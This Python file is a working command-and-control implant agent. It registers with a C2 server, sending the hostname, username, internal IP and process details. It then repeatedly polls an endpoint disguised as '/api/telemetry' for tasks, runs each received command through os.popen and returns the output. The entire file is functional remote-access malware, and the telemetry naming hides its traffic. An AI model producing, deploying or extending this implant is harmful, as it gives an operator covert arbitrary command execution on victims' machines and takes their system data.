import requests
import json
import socket
import time
import os
import sys
import random
import string
import platform
import base64
import struct

URL = 'http://127.0.0.1:4696'
magic = b"\x41\x41\x41\x41"
agentid = "234234"
user_agent = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36'

def uploadData(data):
    b64_str = data.decode('utf-8') if isinstance(data, bytes) else data
    try:
        requests.post(f"{URL}/api/telemetry", json={"data": b64_str})
    except Exception as e:
        print(f"[-] Upload failed: {e}")
    return

def downloadData():
    try:
        r = requests.get(f"{URL}/api/telemetry")
        result = r.json().get("data")
        return result if result else ""
    except Exception:
        return ""

def get_random_string(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

def sendData(data):
    print("[+] Sending data: " + str(base64.b64encode(data).decode('utf-8')))
    uploadData(base64.b64encode(data))
    print("[+] Sent data")
    return

def getData():
    print("[+] Downloading data")
    res = downloadData()
    if not res:
        return b""
    try:
        return base64.b64decode(res)
    except Exception:
        return b""

def parse_command(raw):
    try:
        print(f"[DEBUG] Full raw hex: {raw.hex()}")
        # format: 4 bytes string length (little endian) + string bytes + null
        str_len = struct.unpack("<L", raw[:4])[0]
        cmd = raw[4:4 + str_len - 1].decode('utf-8', errors='ignore').strip()
        print(f"[DEBUG] Parsed command: {repr(cmd)}")
        return cmd
    except Exception as e:
        print(f"[-] Parse failed: {e}")
        return ""

def checkin(data):
    print("[+] Checking in for taskings: " + str(data))
    requestdict = {"task": "gettask", "data": data}
    requestblob = json.dumps(requestdict).encode('utf-8')

    size = len(requestblob) + 12
    size_bytes = size.to_bytes(4, 'big')
    id_bytes = agentid.encode('utf-8') if isinstance(agentid, str) else agentid
    agentid_bytes = id_bytes.ljust(4, b'\x00')[:4]
    agentheader = size_bytes + magic + agentid_bytes

    sendData(agentheader + requestblob)
    task = getData()
    return task

def register():
    hostname = socket.gethostname()
    registerdict = {
        "AgentID":      agentid,
        "Hostname":     hostname,
        "Username":     os.getlogin(),
        "Domain":       "",
        "InternalIP":   socket.gethostbyname(hostname),
        "ProcessPath":  os.getcwd(),
        "PID":          int(os.getpid()),
        "PPID":         0,
        "Architecture": "x64",
        "Elevated":     False,
        "OSBuild":      "None",
        "Sleep":        5,
        "ProcessName":  "python",
        "OSVersion":    str(platform.version()),
        "Active":       True
    }

    registerblob = json.dumps(registerdict).encode('utf-8')
    requestdict = {"task": "register", "data": registerblob.decode('utf-8')}
    requestblob = json.dumps(requestdict).encode('utf-8')

    size = len(requestblob) + 12
    size_bytes = size.to_bytes(4, 'big')
    id_bytes = agentid.encode('utf-8') if isinstance(agentid, str) else agentid
    agentid_bytes = id_bytes.ljust(4, b'\x00')[:4]
    agentheader = size_bytes + magic + agentid_bytes

    print(f"[?] Register header: {agentheader.hex()}")
    print(f"[?] Register size: {size}")

    sendData(agentheader + requestblob)
    time.sleep(6)

    res = getData()
    try:
        return res.decode('utf-8').strip()
    except Exception:
        return ""

def runcommand(command):
    print("[+] Running command: " + str(command))
    if isinstance(command, bytes):
        command = command.decode('utf-8', errors='ignore')
    command = command.strip("\x00").strip()
    if command == "goodbye":
        sys.exit(2)
    output = os.popen(command).read() + "\n"
    return output

def main():
    global agentid
    agentid = get_random_string(4)
    sleeptime = 5
    registered = ""
    outputdata = ""

    while registered != "registered":
        registered = register()
        if registered != "registered":
            time.sleep(5)

    print("REGISTERED SUCCESSFULLY! DROPPING TO SHELL QUEUE.")

    while True:
        commands = checkin(outputdata)
        outputdata = ""

        if commands and len(commands) > 4:
            # check for notask
            try:
                text = commands.decode('utf-8', errors='ignore')
            except Exception:
                text = ""

            if "notask" in text or "COMMAND_NO_JOB" in text:
                print("[*] No jobs. Sleeping...")
            else:
                print(f"[DEBUG] Raw task bytes: {commands.hex()}")
                cmd = parse_command(commands)
                if cmd:
                    try:
                        print("[+] Executing: " + cmd)
                        outputdata = runcommand(cmd).strip("\n")
                        print("[+] Output: " + outputdata)
                    except Exception as e:
                        print("[+] Error: " + str(e))
                        outputdata = f"Error: {str(e)}"
                else:
                    print("[*] Could not parse command from task bytes")

        time.sleep(sleeptime)

if __name__ == "__main__":
    main()